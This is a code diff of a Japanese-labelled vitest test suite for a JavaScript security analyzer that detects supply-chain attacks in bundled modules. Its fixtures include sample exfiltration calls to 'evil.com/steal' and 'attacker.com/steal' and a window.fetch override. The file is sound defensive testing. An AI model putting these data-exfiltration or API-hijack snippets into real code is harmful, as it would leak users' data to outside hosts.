@@ -1,6 +1,6 @@
 import { describe, it, expect } from 'vitest'
 import { analyzeCodeSecurity } from '../src/analyzer.js'
-import { adjustViolationSeverity } from '../src/utils/file-context.js'
+import { adjustViolationSeverity, determineFileContext } from '../src/utils/file-context.js'
 import type { FileContext } from '../src/types.js'
 
 describe('CodeSecurityService - analyzer', () => {
@@ -71,7 +71,7 @@ describe('CodeSecurityService - analyzer', () => {
   })
 
   describe('異常系 - ネットワークAPI検出', () => {
-    it('fetch()の使用を検出', () => {
+    it('fetch()の使用を検出（no-unauthorized-domain）', () => {
       const code = `
         fetch('https://evil.com/steal', {
           method: 'POST',
@@ -84,6 +84,14 @@ describe('CodeSecurityService - analyzer', () => {
       expect(signals.hasNetworkAPI).toBe(true)
       expect(signals.hasNetworkWithoutPermission).toBe(true)
       expect(signals.referencedDomains).toContain('evil.com')
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-unauthorized-domain',
+            severity: 'critical',
+          }),
+        ])
+      )
     })
 
     it('権限付きfetch()は許可', () => {
@@ -264,7 +272,7 @@ describe('CodeSecurityService - analyzer', () => {
   })
 
   describe('異常系 - グローバル変数改ざん', () => {
-    it('window.fetchの上書きを検出', () => {
+    it('window.fetchの上書きを検出（no-sensitive-api-override）', () => {
       const code = `
         const originalFetch = window.fetch
         window.fetch = function(...args) {
@@ -279,7 +287,7 @@ describe('CodeSecurityService - analyzer', () => {
       expect(signals.detectedViolations).toEqual(
         expect.arrayContaining([
           expect.objectContaining({
-            rule: 'no-global-override',
+            rule: 'no-sensitive-api-override',
             severity: 'critical',
           }),
         ])
@@ -432,7 +440,9 @@ describe('CodeSecurityService - analyzer', () => {
 
       expect(signals.hasNetworkAPI).toBe(false)
       expect(signals.hasNetworkWithoutPermission).toBe(false)
-      expect(signals.detectedViolations.filter(v => v.rule === 'no-network-without-permission')).toHaveLength(0)
+      expect(signals.detectedViolations.filter(v =>
+        v.rule === 'no-network-without-permission' || v.rule === 'no-unauthorized-domain'
+      )).toHaveLength(0)
     })
 
     it('通常の fetch は引き続き検出する', () => {
@@ -551,6 +561,170 @@ describe('adjustViolationSeverity - ファイルコンテキスト別の抑制',
 
       const result = adjustViolationSeverity('no-obfuscation', 'critical', userContext)
       expect(result).toBe('critical')
+    })
+  })
+
+  describe('determineFileContext', () => {
+    it('ユーザーコード・共有ライブラリ・MFインフラ以外は isBundledDependency: true', () => {
+      const context = determineFileContext('any-file.js')
+      expect(context.isBundledDependency).toBe(true)
+    })
+
+    it('remoteEntry.js は isBundledDependency: false', () => {
+      const context = determineFileContext('remoteEntry.js')
+      expect(context.isBundledDependency).toBe(false)
+    })
+
+    it('ユーザーコードは正しく判定される', () => {
+      const context = determineFileContext('__federation_expose_World-abc123.js')
+      expect(context.isUserCode).toBe(true)
+      expect(context.isBundledDependency).toBe(false)
+    })
+  })
+})
+
+describe('サプライチェーン攻撃対策 - ルール細分化', () => {
+  describe('no-sensitive-api-override - センシティブ API オーバーライド検出', () => {
+    it('window.fetch = ... は no-sensitive-api-override として検出される', () => {
+      const code = `
+        window.fetch = function(...args) {
+          return originalFetch(...args)
+        }
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-sensitive-api-override',
+            severity: 'critical',
+            message: expect.stringContaining('window.fetch'),
+          }),
+        ])
+      )
+    })
+
+    it('window.XMLHttpRequest = ... は no-sensitive-api-override として検出される', () => {
+      const code = `
+        window.XMLHttpRequest = function() {}
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-sensitive-api-override',
+            message: expect.stringContaining('window.XMLHttpRequest'),
+          }),
+        ])
+      )
+    })
+
+    it('window.__THREE__ = ... は no-global-override（従来ルール）として検出される', () => {
+      const code = `
+        window.__THREE__ = '0.157.0'
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasGlobalVariableOverride).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-global-override',
+            severity: 'critical',
+          }),
+        ])
+      )
+      expect(signals.detectedViolations.filter(v => v.rule === 'no-sensitive-api-override')).toHaveLength(0)
+    })
+  })
+
+  describe('no-unauthorized-domain - リテラル URL の非許可ドメイン検出', () => {
+    it("fetch('https://attacker.com/steal') は no-unauthorized-domain として検出される", () => {
+      const code = `
+        fetch('https://attacker.com/steal', { body: JSON.stringify(data) })
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-unauthorized-domain',
+            severity: 'critical',
+            message: expect.stringContaining('attacker.com'),
+          }),
+        ])
+      )
+    })
+
+    it('動的 URL の fetch は no-network-without-permission として検出される', () => {
+      const code = `
+        const url = getApiUrl()
+        fetch(url)
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-network-without-permission',
+            severity: 'critical',
+          }),
+        ])
+      )
+      expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
+    })
+  })
+
+  describe('neverSuppressRules - バンドル依存でも抑制されない', () => {
+    const bundledContext: FileContext = {
+      filePath: 'three-Ca30qACE.js',
+      isUserCode: false,
+      isSharedLibrary: false,
+      isBundledDependency: true,
+    }
+
+    it('no-sensitive-api-override はバンドル依存でも抑制されない', () => {
+      const result = adjustViolationSeverity('no-sensitive-api-override', 'critical', bundledContext)
+      expect(result).toBe('critical')
+    })
+
+    it('no-unauthorized-domain はバンドル依存でも抑制されない', () => {
+      const result = adjustViolationSeverity('no-unauthorized-domain', 'critical', bundledContext)
+      expect(result).toBe('critical')
+    })
+
+    it('no-global-override はバンドル依存で抑制される（従来通り）', () => {
+      const result = adjustViolationSeverity('no-global-override', 'critical', bundledContext)
+      expect(result).toBeNull()
+    })
+
+    it('no-network-without-permission はバンドル依存で抑制される（従来通り）', () => {
+      const result = adjustViolationSeverity('no-network-without-permission', 'critical', bundledContext)
+      expect(result).toBeNull()
+    })
+
+    it('no-sensitive-api-override は共有ライブラリでも抑制されない', () => {
+      const sharedContext: FileContext = {
+        filePath: '__federation_shared_react.js',
+        isUserCode: false,
+        isSharedLibrary: true,
+        isBundledDependency: false,
+      }
+      expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', sharedContext)).toBe('critical')
+      expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', sharedContext)).toBe('critical')
+    })
+
+    it('no-sensitive-api-override は remoteEntry.js でも抑制されない', () => {
+      const remoteEntryContext: FileContext = {
+        filePath: 'remoteEntry.js',
+        isUserCode: false,
+        isSharedLibrary: false,
+        isBundledDependency: false,
+      }
+      expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', remoteEntryContext)).toBe('critical')
+      expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', remoteEntryContext)).toBe('critical')
     })
   })
 })
